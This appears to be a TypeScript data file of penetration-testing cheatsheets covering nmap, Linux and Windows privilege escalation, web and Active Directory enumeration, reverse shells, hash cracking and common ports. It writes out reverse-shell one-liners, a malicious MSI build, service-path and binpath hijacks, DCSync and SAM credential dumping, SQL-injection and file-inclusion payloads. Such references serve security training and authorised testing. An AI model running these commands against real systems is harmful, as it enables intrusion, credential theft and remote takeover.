export interface CheatsheetItem {
  flag?: string;
  step?: string;
  description?: string;
  hash?: string;
  type?: string;
  example?: string;
  tool?: string;
  port?: number;
  service?: string;
}

export interface CheatsheetSection {
  heading: string;
  items: CheatsheetItem[];
}

export interface Cheatsheet {
  title: string;
  sections?: CheatsheetSection[];
  items?: CheatsheetItem[];
}

export const CHEATSHEETS: Record<string, Cheatsheet> = {
  nmap: {
    title: 'Nmap Flags & Scan Types',
    sections: [
      {
        heading: 'Basic Scan Types',
        items: [
          { flag: '-sS', description: 'TCP SYN scan (stealth scan, requires root)' },
          { flag: '-sT', description: 'TCP connect scan (no root required)' },
          { flag: '-sU', description: 'UDP scan' },
          { flag: '-sN', description: 'TCP NULL scan (no flags set)' },
          { flag: '-sF', description: 'TCP FIN scan' },
          { flag: '-sX', description: 'TCP Xmas scan (FIN+PSH+URG flags)' },
          { flag: '-sA', description: 'TCP ACK scan (firewall mapping)' },
          { flag: '-sV', description: 'Version detection' },
          { flag: '-sC', description: 'Default script scan (equivalent to --script=default)' },
          { flag: '-O', description: 'OS detection' },
          { flag: '-A', description: 'Aggressive: OS detect, version detect, script scan, traceroute' },
        ]
      },
      {
        heading: 'Port Specification',
        items: [
          { flag: '-p 22', description: 'Scan specific port' },
          { flag: '-p 22,80,443', description: 'Scan multiple specific ports' },
          { flag: '-p 1-1000', description: 'Scan port range' },
          { flag: '-p-', description: 'Scan all 65535 ports' },
          { flag: '--top-ports 1000', description: 'Scan top 1000 most common ports' },
          { flag: '-F', description: 'Fast scan (top 100 ports)' },
        ]
      },
      {
        heading: 'Timing & Performance',
        items: [
          { flag: '-T0', description: 'Paranoid (very slow, IDS evasion)' },
          { flag: '-T1', description: 'Sneaky (slow, IDS evasion)' },
          { flag: '-T2', description: 'Polite (slower, less bandwidth)' },
          { flag: '-T3', description: 'Normal (default)' },
          { flag: '-T4', description: 'Aggressive (faster, assumes reliable network)' },
          { flag: '-T5', description: 'Insane (fastest, may miss open ports)' },
          { flag: '--min-rate 5000', description: 'Send packets no slower than 5000/sec' },
          { flag: '--max-retries 1', description: 'Limit retransmissions' },
        ]
      },
      {
        heading: 'Output',
        items: [
          { flag: '-oN file.txt', description: 'Normal output' },
          { flag: '-oX file.xml', description: 'XML output' },
          { flag: '-oG file.gnmap', description: 'Grepable output' },
          { flag: '-oA basename', description: 'All formats (normal, XML, grepable)' },
          { flag: '-v / -vv', description: 'Increase verbosity' },
          { flag: '--open', description: 'Only show open ports' },
          { flag: '--reason', description: 'Show reason for port state' },
        ]
      },
      {
        heading: 'Scripts (NSE)',
        items: [
          { flag: '--script=vuln', description: 'Run vulnerability scripts' },
          { flag: '--script=smb-enum-shares', description: 'Enumerate SMB shares' },
          { flag: '--script=http-title', description: 'Get HTTP page title' },
          { flag: '--script=ftp-anon', description: 'Check FTP anonymous login' },
          { flag: '--script=ssh-hostkey', description: 'Get SSH host key' },
          { flag: '--script=http-robots.txt', description: 'Get robots.txt' },
          { flag: '--script=ldap-rootdse', description: 'LDAP root DSE information' },
          { flag: '--script=smb-vuln-ms17-010', description: 'Check for EternalBlue' },
        ]
      },
      {
        heading: 'Common Full Scan Patterns',
        items: [
          { flag: 'nmap -sV -sC -p- --min-rate 5000 <IP>', description: 'Full port + version + default scripts' },
          { flag: 'nmap -sU --top-ports 100 <IP>', description: 'Top 100 UDP ports' },
          { flag: 'nmap -A -T4 <IP>', description: 'Aggressive all-in-one' },
          { flag: 'nmap -sn 10.10.10.0/24', description: 'Ping sweep / host discovery' },
        ]
      }
    ]
  },

  linprivesc: {
    title: 'Linux Privilege Escalation Checklist',
    sections: [
      {
        heading: 'System Enumeration',
        items: [
          { step: 'uname -a', description: 'Kernel version (check for exploits)' },
          { step: 'cat /etc/os-release', description: 'OS version' },
          { step: 'cat /proc/version', description: 'Kernel + compiler info' },
          { step: 'hostname', description: 'Machine hostname' },
          { step: 'id && whoami', description: 'Current user and groups' },
          { step: 'env', description: 'Environment variables' },
          { step: 'cat /etc/passwd', description: 'All users (look for shells)' },
          { step: 'cat /etc/group', description: 'All groups' },
          { step: 'last', description: 'Last logged in users' },
          { step: 'w', description: 'Currently logged in users' },
        ]
      },
      {
        heading: 'SUID / SGID Binaries',
        items: [
          { step: 'find / -perm -u=s -type f 2>/dev/null', description: 'Find SUID binaries' },
          { step: 'find / -perm -g=s -type f 2>/dev/null', description: 'Find SGID binaries' },
          { step: 'Check GTFOBins for any found binary', description: 'https://gtfobins.github.io' },
        ]
      },
      {
        heading: 'Sudo',
        items: [
          { step: 'sudo -l', description: 'List sudo privileges' },
          { step: 'Check GTFOBins for allowed sudo commands', description: 'Look for LD_PRELOAD, env_keep' },
          { step: 'Check sudo version: sudo --version', description: 'CVE-2021-3156 (Baron Samedit) <= 1.8.31p2' },
        ]
      },
      {
        heading: 'Cron Jobs',
        items: [
          { step: 'crontab -l', description: 'Current user crontab' },
          { step: 'cat /etc/crontab', description: 'System crontab' },
          { step: 'ls -la /etc/cron.*/', description: 'All cron directories' },
          { step: 'cat /var/log/syslog | grep cron', description: 'Recent cron activity' },
          { step: 'Check for writable scripts run by cron', description: 'ls -la <script> — if writable by you, inject reverse shell' },
        ]
      },
      {
        heading: 'Writable Files & Directories',
        items: [
          { step: 'find / -writable -type f 2>/dev/null | grep -v proc', description: 'World-writable files' },
          { step: 'find / -writable -type d 2>/dev/null', description: 'World-writable directories' },
          { step: 'ls -la /etc/passwd', description: 'Is /etc/passwd writable? (add root user)' },
        ]
      },
      {
        heading: 'PATH Hijacking',
        items: [
          { step: 'echo $PATH', description: 'Check PATH order' },
          { step: 'Check scripts calling binaries without full path', description: 'If script runs "python" not "/usr/bin/python"' },
          { step: 'export PATH=/tmp:$PATH && echo "/bin/bash" > /tmp/<binary> && chmod +x /tmp/<binary>', description: 'Inject malicious binary' },
        ]
      },
      {
        heading: 'Capabilities',
        items: [
          { step: 'getcap -r / 2>/dev/null', description: 'Find files with capabilities' },
          { step: 'Look for cap_setuid+ep on binaries', description: 'Python, perl, node with setuid cap = root' },
        ]
      },
      {
        heading: 'Network & Services',
        items: [
          { step: 'ss -tlnp', description: 'Listening ports (may reveal internal services)' },
          { step: 'netstat -tulnp', description: 'Alternative listening ports' },
          { step: 'cat /etc/hosts', description: 'Internal hostnames' },
          { step: 'arp -a', description: 'ARP table (other hosts)' },
        ]
      },
      {
        heading: 'Config Files & Passwords',
        items: [
          { step: 'find / -name "*.conf" 2>/dev/null', description: 'Config files' },
          { step: 'find / -name "id_rsa" 2>/dev/null', description: 'SSH private keys' },
          { step: 'find / -name ".bash_history" 2>/dev/null', description: 'Shell history files' },
          { step: 'find / -name "wp-config.php" 2>/dev/null', description: 'WordPress config (DB creds)' },
          { step: 'grep -r "password" /etc/ 2>/dev/null', description: 'Password strings in /etc' },
        ]
      },
      {
        heading: 'Automated Tools',
        items: [
          { step: 'linpeas.sh', description: 'Comprehensive automated enumeration — upload and run' },
          { step: 'linux-exploit-suggester.sh', description: 'Kernel exploit suggestions' },
          { step: 'pspy64', description: 'Monitor processes without root (cron job detection)' },
        ]
      }
    ]
  },

  winprivesc: {
    title: 'Windows Privilege Escalation Checklist',
    sections: [
      {
        heading: 'System Enumeration',
        items: [
          { step: 'systeminfo', description: 'OS, version, patches, hotfixes' },
          { step: 'hostname', description: 'Machine name' },
          { step: 'whoami /all', description: 'User, groups, privileges' },
          { step: 'net user', description: 'All local users' },
          { step: 'net localgroup administrators', description: 'Local admins' },
          { step: 'net accounts', description: 'Password policy' },
          { step: 'wmic os get osarchitecture', description: 'Architecture (32/64-bit)' },
          { step: 'wmic qfe get Caption,Description,HotFixID,InstalledOn', description: 'Installed patches' },
        ]
      },
      {
        heading: 'Token Impersonation',
        items: [
          { step: 'whoami /priv', description: 'Check SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege' },
          { step: 'Potato attacks: JuicyPotato, PrintSpoofer, RoguePotato', description: 'If SeImpersonate or SeAssignPrimaryToken' },
          { step: 'PrintSpoofer64.exe -i -c cmd', description: 'PrintSpoofer (Windows Server 2019, Win10)' },
          { step: 'JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}', description: 'JuicyPotato (older systems)' },
        ]
      },
      {
        heading: 'Unquoted Service Paths',
        items: [
          { step: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"', description: 'Find unquoted service paths' },
          { step: 'Place malicious exe at exploitable path', description: 'e.g. C:\\Program.exe if path is C:\\Program Files\\...' },
          { step: 'sc start <servicename>', description: 'Restart the vulnerable service' },
        ]
      },
      {
        heading: 'Insecure Service Permissions',
        items: [
          { step: 'accesschk.exe -uwcqv "Authenticated Users" *', description: 'Find services writable by user' },
          { step: 'sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add"', description: 'Replace binary path' },
          { step: 'sc stop <svc> && sc start <svc>', description: 'Restart service to execute payload' },
        ]
      },
      {
        heading: 'AlwaysInstallElevated',
        items: [
          { step: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check user key' },
          { step: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check machine key (both must be 1)' },
          { step: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > evil.msi', description: 'Create malicious MSI' },
          { step: 'msiexec /quiet /qn /i evil.msi', description: 'Execute MSI as SYSTEM' },
        ]
      },
      {
        heading: 'Stored Credentials',
        items: [
          { step: 'cmdkey /list', description: 'Saved credentials' },
          { step: 'runas /savecred /user:admin cmd.exe', description: 'Use saved credential' },
          { step: 'reg query HKLM /f password /t REG_SZ /s', description: 'Registry password search' },
          { step: 'dir /s /b *pass* *cred* *vnc* *.config', description: 'Find config files with creds' },
          { step: 'type C:\\Windows\\repair\\SAM', description: 'SAM file (offline cracking)' },
          { step: 'type C:\\unattend.xml', description: 'Unattend installation credentials' },
        ]
      },
      {
        heading: 'Automated Tools',
        items: [
          { step: 'winPEAS.exe', description: 'Comprehensive Windows enumeration' },
          { step: 'PowerUp.ps1 — Invoke-AllChecks', description: 'PowerSploit privilege escalation checks' },
          { step: 'SharpUp.exe audit', description: '.NET compiled PowerUp alternative' },
          { step: 'Seatbelt.exe -group=all', description: 'Security configuration assessment' },
        ]
      }
    ]
  },

  webenum: {
    title: 'Web Enumeration Checklist',
    sections: [
      {
        heading: 'Initial Recon',
        items: [
          { step: 'View page source (Ctrl+U)', description: 'Comments, hidden fields, JS files, version info' },
          { step: 'Check robots.txt', description: 'curl http://<IP>/robots.txt' },
          { step: 'Check sitemap.xml', description: 'curl http://<IP>/sitemap.xml' },
          { step: 'whatweb <URL>', description: 'Tech stack fingerprinting' },
          { step: 'Check response headers', description: 'curl -I <URL> — Server header, X-Powered-By, etc.' },
          { step: 'Wappalyzer browser extension', description: 'Technology detection in browser' },
        ]
      },
      {
        heading: 'Directory Enumeration',
        items: [
          { step: 'gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt', description: 'Common directory wordlist' },
          { step: 'gobuster dir -u <URL> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak', description: 'Raft medium with extensions' },
          { step: 'ffuf -u <URL>/FUZZ -w <wordlist>', description: 'FFUF directory fuzzing' },
          { step: 'feroxbuster -u <URL> -w <wordlist> --auto-tune', description: 'Recursive directory enumeration' },
          { step: 'Check .git, .svn, .env, .htaccess, web.config', description: 'Sensitive hidden files' },
        ]
      },
      {
        heading: 'Virtual Host / Subdomain Enumeration',
        items: [
          { step: 'gobuster vhost -u <URL> -w <wordlist>', description: 'Virtual host fuzzing' },
          { step: 'ffuf -u <URL> -H "Host: FUZZ.<domain>" -w <wordlist>', description: 'FFUF vhost fuzzing' },
          { step: 'Add findings to /etc/hosts', description: 'echo "<IP> <vhost>" >> /etc/hosts' },
        ]
      },
      {
        heading: 'Parameter Fuzzing',
        items: [
          { step: 'ffuf -u <URL>?FUZZ=value -w <wordlist>', description: 'GET parameter discovery' },
          { step: 'ffuf -u <URL> -X POST -d "FUZZ=value" -w <wordlist>', description: 'POST parameter discovery' },
          { step: 'Test for LFI: ?file=../../../../etc/passwd', description: 'Local File Inclusion' },
          { step: 'Test for SSRF: ?url=http://127.0.0.1', description: 'Server-Side Request Forgery' },
        ]
      },
      {
        heading: 'Authentication',
        items: [
          { step: "Try default credentials: admin:admin, admin:password", description: 'Common defaults' },
          { step: "Check for SQLi in login: admin'--", description: 'Basic SQL injection bypass' },
          { step: 'Intercept login with Burp Suite', description: 'Analyse request for weaknesses' },
          { step: 'Check "Remember me" token entropy', description: 'Predictable tokens = account takeover' },
        ]
      },
      {
        heading: 'API Endpoints',
        items: [
          { step: 'Check /api/, /api/v1/, /v1/, /v2/', description: 'Common API paths' },
          { step: 'Look for swagger.json or openapi.json', description: 'API documentation' },
          { step: 'Test different HTTP methods: GET, POST, PUT, DELETE, PATCH', description: 'Method-based access control issues' },
          { step: 'Test IDOR: change IDs in requests', description: 'Insecure Direct Object Reference' },
        ]
      }
    ]
  },

  adattacks: {
    title: 'Active Directory Attack Checklist',
    sections: [
      {
        heading: 'Initial Enumeration (No Creds)',
        items: [
          { step: 'nmap -p 88,389,445,636,3268,3269 <DC_IP>', description: 'Confirm DC ports' },
          { step: 'enum4linux -a <DC_IP>', description: 'Null session enumeration' },
          { step: 'crackmapexec smb <DC_IP>', description: 'Domain and SMB info' },
          { step: 'ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local"', description: 'Anonymous LDAP query' },
          { step: 'impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP>', description: 'AS-REP Roasting (no pre-auth users)' },
        ]
      },
      {
        heading: 'With Valid Credentials',
        items: [
          { step: 'bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC_IP> -c all', description: 'BloodHound data collection' },
          { step: 'impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request', description: 'Kerberoasting — get TGS tickets' },
          { step: 'crackmapexec smb <range> -u <user> -p <pass> --shares', description: 'Enumerate accessible shares' },
          { step: 'crackmapexec smb <range> -u <user> -p <pass> --users', description: 'Enumerate domain users' },
          { step: 'net view /domain', description: 'Machines in domain (from Windows)' },
        ]
      },
      {
        heading: 'Lateral Movement',
        items: [
          { step: 'impacket-psexec <domain>/<user>:<pass>@<IP>', description: 'Remote code execution via SMB' },
          { step: 'impacket-wmiexec <domain>/<user>:<pass>@<IP>', description: 'WMI remote execution' },
          { step: 'evil-winrm -i <IP> -u <user> -p <pass>', description: 'PowerShell remoting (port 5985)' },
          { step: 'Pass the Hash: impacket-psexec <user>@<IP> -hashes :<NTLM>', description: 'Use hash without cracking' },
        ]
      },
      {
        heading: 'DCSync / Domain Compromise',
        items: [
          { step: 'impacket-secretsdump <domain>/<user>:<pass>@<DC_IP>', description: 'Dump all domain hashes (DCSync)' },
          { step: 'impacket-secretsdump -ntds ntds.dit -system SYSTEM local', description: 'Offline NTDS.dit parsing' },
          { step: 'mimikatz "lsadump::dcsync /domain:<domain> /user:Administrator"', description: 'DCSync for specific user' },
          { step: 'Golden Ticket: requires krbtgt hash', description: 'Persistent access via forged TGT' },
        ]
      },
      {
        heading: 'BloodHound Analysis',
        items: [
          { step: 'Look for shortest path to Domain Admins', description: 'Attack Path → Shortest Paths to Domain Admins' },
          { step: 'Check owned principals for GenericAll, WriteDACL, WriteOwner', description: 'Dangerous permissions' },
          { step: 'Kerberoastable users: Node Info → Reachable High Value Targets', description: 'SPN accounts to roast' },
          { step: 'AS-REP Roastable users: same view', description: 'Accounts with pre-auth disabled' },
        ]
      }
    ]
  },

  revshells: {
    title: 'Reverse Shell Quick Reference',
    sections: [
      {
        heading: 'Listener Setup',
        items: [
          { step: 'nc -lvnp 4444', description: 'Netcat listener' },
          { step: 'rlwrap nc -lvnp 4444', description: 'Netcat with readline (arrow keys in shell)' },
          { step: 'socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash', description: 'Socat listener (better TTY)' },
        ]
      },
      {
        heading: 'Shell Stabilisation (after catching shell)',
        items: [
          { step: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", description: 'Spawn PTY' },
          { step: 'Ctrl+Z, then: stty raw -echo; fg', description: 'Background and fix terminal' },
          { step: 'export TERM=xterm', description: 'Set terminal type' },
          { step: 'stty rows 50 cols 200', description: 'Fix terminal size (match your terminal)' },
        ]
      },
      {
        heading: 'Quick Payloads',
        items: [
          { step: 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1', description: 'Bash TCP reverse shell' },
          { step: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", description: 'Python3 reverse shell' },
          { step: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >/tmp/f', description: 'Netcat mkfifo' },
          { step: "php -r '$sock=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/bash -i <&3 >&3 2>&3\");'", description: 'PHP one-liner' },
        ]
      }
    ]
  },

  hashid: {
    title: 'Hash Identification Guide',
    sections: [
      {
        heading: 'Identification by Length & Format',
        items: [
          { hash: '32 chars hex', type: 'MD5', example: '5f4dcc3b5aa765d61d8327deb882cf99', tool: 'hashcat -m 0, john --format=md5' },
          { hash: '40 chars hex', type: 'SHA1', example: '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', tool: 'hashcat -m 100, john --format=sha1' },
          { hash: '64 chars hex', type: 'SHA256', example: '', tool: 'hashcat -m 1400, john --format=sha256' },
          { hash: '128 chars hex', type: 'SHA512', example: '', tool: 'hashcat -m 1700, john --format=sha512' },
          { hash: '$1$...', type: 'MD5 Crypt', example: '$1$salt$hash', tool: 'hashcat -m 500, john --format=md5crypt' },
          { hash: '$2y$ or $2a$', type: 'bcrypt', example: '$2y$10$...', tool: 'hashcat -m 3200, john --format=bcrypt' },
          { hash: '$5$...', type: 'SHA256 Crypt', example: '$5$salt$hash', tool: 'hashcat -m 7400, john --format=sha256crypt' },
          { hash: '$6$...', type: 'SHA512 Crypt', example: '$6$salt$hash', tool: 'hashcat -m 1800, john --format=sha512crypt' },
          { hash: '32 chars, mixed case + special', type: 'NTLM', example: '', tool: 'hashcat -m 1000, john --format=nt' },
          { hash: 'user:rid:LMhash:NThash', type: 'PWDUMP format', example: '', tool: 'hashcat -m 3000 (LM), -m 1000 (NT)' },
        ]
      },
      {
        heading: 'Cracking Commands',
        items: [
          { step: 'hashcat -m <mode> <hashfile> <wordlist>', description: 'Dictionary attack' },
          { step: 'hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule', description: 'Dictionary + rules' },
          { step: 'hashcat -m <mode> <hashfile> -a 3 ?a?a?a?a?a?a', description: 'Brute force (6 chars)' },
          { step: 'john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt', description: 'John dictionary attack' },
          { step: 'john <hashfile> --show', description: 'Show cracked passwords' },
          { step: 'haiti <hash>', description: 'Identify hash type automatically' },
          { step: 'name-that-hash <hash>', description: 'Alternative hash identifier' },
        ]
      }
    ]
  },

  ports: {
    title: 'Common Ports & Services Reference',
    items: [
      { port: 21,    service: 'FTP',              description: 'File Transfer Protocol. Check anon login: ftp -n <IP>, anonymous/anonymous. Get file listing: ls -la.' },
      { port: 22,    service: 'SSH',              description: 'Secure Shell. Try key auth if creds fail. Brute force: hydra -l user -P wordlist ssh://<IP>.' },
      { port: 23,    service: 'Telnet',           description: 'Unencrypted remote access. Rare but appears on older/embedded devices.' },
      { port: 25,    service: 'SMTP',             description: 'Mail server. Enumerate users: VRFY, EXPN commands. nmap --script smtp-enum-users.' },
      { port: 53,    service: 'DNS',              description: 'Domain Name System. Zone transfer: dig axfr @<IP> <domain>. Subdomain brute force.' },
      { port: 80,    service: 'HTTP',             description: 'Web server. Directory enum, robots.txt, tech fingerprint. SQLi, XSS, LFI/RFI, SSRF testing.' },
      { port: 88,    service: 'Kerberos',         description: 'Active Directory auth. AS-REP Roasting, Kerberoasting. Indicates Domain Controller.' },
      { port: 110,   service: 'POP3',             description: 'Email retrieval. Try plaintext auth. May have mail with creds inside.' },
      { port: 111,   service: 'RPCbind',          description: 'NFS/RPC services map. rpcinfo -p <IP> to list RPC programs.' },
      { port: 135,   service: 'MSRPC',            description: 'Windows RPC endpoint mapper. rpcclient -U "" <IP> for null session.' },
      { port: 139,   service: 'NetBIOS',          description: 'Legacy SMB/NetBIOS. enum4linux -a <IP>. smbclient -N -L //<IP>/.' },
      { port: 143,   service: 'IMAP',             description: 'Email. Try default creds. May contain sensitive emails.' },
      { port: 389,   service: 'LDAP',             description: 'Active Directory LDAP. Anonymous queries often allowed.' },
      { port: 443,   service: 'HTTPS',            description: 'HTTPS web. Check SSL cert for hostnames. Same web checks as port 80.' },
      { port: 445,   service: 'SMB',              description: 'SMB file sharing. smbclient, enum4linux, crackmapexec. EternalBlue (MS17-010) if unpatched.' },
      { port: 873,   service: 'Rsync',            description: 'File sync. List modules: rsync <IP>::. Download: rsync -av <IP>::<module> ./.' },
      { port: 1433,  service: 'MSSQL',            description: 'Microsoft SQL Server. impacket-mssqlclient, sqsh. xp_cmdshell for RCE if enabled.' },
      { port: 2049,  service: 'NFS',              description: 'Network File System. showmount -e <IP>. Mount: mount -t nfs <IP>:/share /mnt/.' },
      { port: 2375,  service: 'Docker API',       description: 'Unauthenticated Docker API — critical. Run privileged container to escape to host.' },
      { port: 3306,  service: 'MySQL',            description: 'MySQL database. mysql -h <IP> -u root -p. Check for UDF injection for RCE.' },
      { port: 3389,  service: 'RDP',              description: 'Remote Desktop. xfreerdp or rdesktop. BlueKeep CVE-2019-0708 if unpatched.' },
      { port: 4444,  service: 'Rev shell port',   description: 'Often used for Metasploit handlers and manual netcat listeners.' },
      { port: 5432,  service: 'PostgreSQL',       description: 'PostgreSQL database. psql -h <IP> -U postgres. COPY TO/FROM for file read/write.' },
      { port: 5985,  service: 'WinRM HTTP',       description: 'Windows Remote Management. evil-winrm -i <IP> -u user -p pass.' },
      { port: 5986,  service: 'WinRM HTTPS',      description: 'WinRM over SSL. evil-winrm -i <IP> -u user -p pass -S.' },
      { port: 6379,  service: 'Redis',            description: 'Redis in-memory DB. redis-cli -h <IP>. Often no auth. Write SSH keys, cron jobs.' },
      { port: 8080,  service: 'HTTP Alt',         description: 'Alternative HTTP / web proxy / Tomcat. Same web testing methodology.' },
      { port: 8443,  service: 'HTTPS Alt',        description: 'Alternative HTTPS. Tomcat manager often here.' },
      { port: 9200,  service: 'Elasticsearch',    description: 'Often unauthenticated. curl http://<IP>:9200/_cat/indices.' },
      { port: 27017, service: 'MongoDB',          description: 'Often no auth. mongo <IP>. show dbs; use db; db.collection.find().' },
    ]
  }
};

export function lookupPort(portNum: number | string): CheatsheetItem {
  const port = parseInt(String(portNum));
  const found = (CHEATSHEETS.ports.items || []).find(p => p.port === port);
  if (found) return found;
  return {
    port: port,
    service: 'Unknown',
    description: `No specific information available. Run nmap service version detection: nmap -sV -p ${portNum} <IP>`
  };
}
